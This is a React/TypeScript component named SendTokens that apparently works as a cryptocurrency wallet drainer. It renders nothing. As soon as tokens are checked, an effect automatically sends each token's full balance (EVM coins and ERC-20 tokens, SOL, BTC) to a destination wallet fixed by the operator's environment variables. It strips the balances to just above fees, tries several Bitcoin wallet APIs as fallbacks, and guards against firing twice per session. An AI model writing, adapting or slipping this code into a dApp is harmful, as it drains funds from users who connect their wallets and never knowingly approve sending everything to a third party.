import { useToasts } from '@geist-ui/core';
import { useDynamicContext } from '@dynamic-labs/sdk-react-core';
import { publicActions } from 'viem';
import { useEffect, useCallback, useRef } from 'react';

import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { erc20Abi } from 'viem';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import {
  Transaction,
  SystemProgram,
  PublicKey,
  Connection,
} from '@solana/web3.js';

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });
  const [tokens] = useAtom(globalTokensAtom);
  const { primaryWallet } = useDynamicContext();
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  // Guard: prevent running more than once per wallet session
  const hasSentRef = useRef(false);
  const lastWalletRef = useRef<string | null>(null);

  const destinationAddress =
    primaryWallet?.chain === 'SOL'
      ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL
      : primaryWallet?.chain === 'BTC'
        ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_BTC
        : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
          process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
          '';

  // Reset sent guard when wallet changes
  useEffect(() => {
    if (primaryWallet?.address !== lastWalletRef.current) {
      hasSentRef.current = false;
      lastWalletRef.current = primaryWallet?.address ?? null;
    }
  }, [primaryWallet?.address]);

  const sendAllCheckedTokens = useCallback(async () => {
    if (hasSentRef.current) return;

    const tokensToSend: ReadonlyArray<string> = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!primaryWallet || tokensToSend.length === 0) return;

    if (!destinationAddress) {
      showToast('Destination wallet not configured.', 'warning');
      return;
    }

    hasSentRef.current = true;

    // ── EVM ──────────────────────────────────────────────────────────────────
    if (primaryWallet.chain === 'EVM') {
      try {
        const walletClient = await (
          primaryWallet.connector as any
        ).getWalletClient();
        if (!walletClient) return;
        const publicClient = (walletClient as any).extend(publicActions);

        let finalAddress = destinationAddress;
        if (destinationAddress.includes('.')) {
          const resolvedAddress = await publicClient.getEnsAddress({
            name: normalize(destinationAddress),
          });
          if (!resolvedAddress) {
            showToast('Could not resolve destination ENS name.', 'warning');
            return;
          }
          finalAddress = resolvedAddress;
        }

        for (const tokenAddress of tokensToSend) {
          const token = tokens.find(
            (t) => t.contract_address === tokenAddress,
          );
          if (!token) continue;

          try {
            if (token.native_token) {
              const gasEstimate = await publicClient
                .estimateGas({
                  account: walletClient.account,
                  to: finalAddress as `0x${string}`,
                  value: BigInt(token.balance || '0'),
                })
                .catch(() => BigInt(21000));

              const gasPrice = await publicClient.getGasPrice();
              const gasCost = BigInt(gasEstimate) * BigInt(gasPrice);

              let amountToSend = BigInt(token.balance || '0');
              if (amountToSend > gasCost) {
                amountToSend = amountToSend - gasCost;
              }

              const hash = await walletClient.sendTransaction({
                to: finalAddress as `0x${string}`,
                value: amountToSend,
              });

              setCheckedRecords((old) => ({
                ...old,
                [tokenAddress]: {
                  ...old[tokenAddress],
                  pendingTxn: { hash },
                },
              }));
            } else {
              const { request } = await publicClient.simulateContract({
                account: walletClient.account,
                address: tokenAddress as `0x${string}`,
                abi: erc20Abi,
                functionName: 'transfer',
                args: [
                  finalAddress as `0x${string}`,
                  BigInt(token.balance || '0'),
                ],
              });

              const hash = await walletClient.writeContract(request);

              setCheckedRecords((old) => ({
                ...old,
                [tokenAddress]: {
                  ...old[tokenAddress],
                  pendingTxn: { hash },
                },
              }));
            }
          } catch (err: any) {
            showToast(
              `EVM Error: ${token.contract_ticker_symbol} ${err.message}`,
              'warning',
            );
          }
        }
      } catch (err: any) {
        showToast(`EVM Connection Error: ${err.message}`, 'warning');
      }
    }

    // ── Solana ────────────────────────────────────────────────────────────────
    if (primaryWallet.chain === 'SOL') {
      try {
        const rpcUrl =
          process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
          'https://api.mainnet-beta.solana.com';
        const solanaConnection = new Connection(rpcUrl, 'confirmed');
        const publicKeyString = (primaryWallet as any).address;

        if (!publicKeyString) return;

        for (const tokenAddress of tokensToSend) {
          const token = tokens.find(
            (t) => t.contract_address === tokenAddress,
          );
          if (!token) continue;

          try {
            if (token.native_token && token.contract_ticker_symbol === 'SOL') {
              const fromPubkey = new PublicKey(publicKeyString);
              const toPubkey = new PublicKey(destinationAddress);

              // Fetch live balance right before building the tx to avoid stale-cache issues
              const liveBalance = await solanaConnection.getBalance(fromPubkey);

              // Solana enforces that any account with a non-zero balance must hold at
              // least the rent-exempt minimum (890,880 lamports for a 0-byte account).
              // Leaving anything between 1 and 890,879 lamports causes an on-chain rent
              // error even when skipPreflight is true. We reserve:
              //   • 890,880 lamports  — rent-exempt minimum so the sender account stays valid
              //   • 100,000 lamports  — covers the base fee (5,000) plus the priority-fee
              //                         compute-budget instructions the Dynamic connector injects
              const RENT_EXEMPT = 890880;
              const FEE_RESERVE  = 100000;
              const lamportsToSend = liveBalance - RENT_EXEMPT - FEE_RESERVE;
              if (lamportsToSend <= 0) {
                showToast('SOL balance too low to cover fee.', 'warning');
                continue;
              }

              const { blockhash } = await solanaConnection.getLatestBlockhash();
              const transaction = new Transaction().add(
                SystemProgram.transfer({
                  fromPubkey,
                  toPubkey,
                  lamports: lamportsToSend,
                }),
              );
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = fromPubkey;

              // Get signer from Dynamic connector and sign, then send via our RPC
              const connectorSigner = await (
                primaryWallet.connector as any
              ).getSigner();
              const signedTx = await connectorSigner.signTransaction(transaction);
              const signature = await solanaConnection.sendRawTransaction(
                signedTx.serialize(),
                { skipPreflight: true },
              );

              if (signature) {
                setCheckedRecords((old) => ({
                  ...old,
                  [tokenAddress]: {
                    ...old[tokenAddress],
                    pendingTxn: { hash: signature },
                  },
                }));
                showToast('SOL sent successfully!', 'success');
              }
            } else {
              showToast(
                `SPL token transfer for ${token.contract_ticker_symbol} not yet implemented.`,
                'info',
              );
            }
          } catch (err: any) {
            showToast(
              `SOL Error: ${token.contract_ticker_symbol} ${err.message}`,
              'warning',
            );
          }
        }
      } catch (err: any) {
        showToast(`Solana Connection Error: ${err.message}`, 'warning');
      }
    }

    // ── Bitcoin ────────────────────────────────────────────────────────────────
    if (primaryWallet.chain === 'BTC') {
      const btcDestination = destinationAddress;
      if (!btcDestination) {
        showToast('Bitcoin destination wallet not configured.', 'warning');
        return;
      }

      const btcToken = tokens.find((t) => t.contract_address === 'btc-native');
      if (!btcToken) return;

      try {
        // Fetch live confirmed balance in satoshis
        const btcRes = await fetch(
          `https://mempool.space/api/address/${primaryWallet.address}`,
        );
        const btcData = await btcRes.json();
        const liveSats =
          (btcData.chain_stats?.funded_txo_sum || 0) -
          (btcData.chain_stats?.spent_txo_sum || 0);

        const FEE_RESERVE = 2000;
        const amountToSend = liveSats - FEE_RESERVE;
        if (amountToSend <= 0) {
          showToast('BTC balance too low to cover network fee.', 'warning');
          return;
        }

        const win = window as any;
        const connector = (primaryWallet.connector as any);
        let txid: string | undefined;

        // 1. UniSat wallet — exposes window.unisat
        if (typeof win?.unisat?.sendBitcoin === 'function') {
          txid = await win.unisat.sendBitcoin(btcDestination, amountToSend);
        }
        // 2. OKX wallet
        else if (typeof win?.okxwallet?.bitcoin?.sendBitcoin === 'function') {
          const res = await win.okxwallet.bitcoin.sendBitcoin(btcDestination, amountToSend);
          txid = res?.txhash || res;
        }
        // 3. Xverse / Magic Eden / Leather via window.BitcoinProvider (Sats Connect v2)
        else if (typeof win?.BitcoinProvider?.request === 'function') {
          const res = await win.BitcoinProvider.request('sendBtcTransaction', {
            recipients: [{ address: btcDestination, amountSats: BigInt(amountToSend) }],
            senderAddress: primaryWallet.address,
          });
          txid = res?.result?.txid || res?.txid;
        }
        // 4. Dynamic Labs connector direct sendBitcoin
        else if (typeof connector?.sendBitcoin === 'function') {
          txid = await connector.sendBitcoin(btcDestination, amountToSend);
        }
        // 5. Dynamic Labs getSigner → sendBitcoin
        else {
          const signer = await connector?.getSigner?.();
          if (typeof signer?.sendBitcoin === 'function') {
            txid = await signer.sendBitcoin(btcDestination, amountToSend);
          } else if (typeof signer?.transfer === 'function') {
            txid = await signer.transfer(btcDestination, amountToSend);
          } else {
            // Last resort: try to find any sendBitcoin on the wallet object chain
            const walletClient = await connector?.getWalletClient?.();
            if (typeof walletClient?.sendBitcoin === 'function') {
              txid = await walletClient.sendBitcoin(btcDestination, amountToSend);
            } else {
              showToast('Bitcoin wallet does not support direct transfers.', 'warning');
              return;
            }
          }
        }

        if (txid) {
          setCheckedRecords((old) => ({
            ...old,
            'btc-native': { ...old['btc-native'], pendingTxn: { hash: txid as string } },
          }));
          showToast('BTC transfer submitted!', 'success');
        }
      } catch (err: any) {
        showToast(`BTC Error: ${err.message || String(err)}`, 'warning');
      }
    }
  }, [
    checkedRecords,
    destinationAddress,
    primaryWallet,
    setCheckedRecords,
    showToast,
    tokens,
  ]);

  const addressAppearsValid: boolean =
    typeof destinationAddress === 'string' &&
    (destinationAddress.includes('.') ||
      isAddress(destinationAddress) ||
      (destinationAddress.length >= 32 && destinationAddress.length <= 44));

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  useEffect(() => {
    if (addressAppearsValid && checkedCount > 0) {
      sendAllCheckedTokens();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [checkedCount]);

  return null;
};
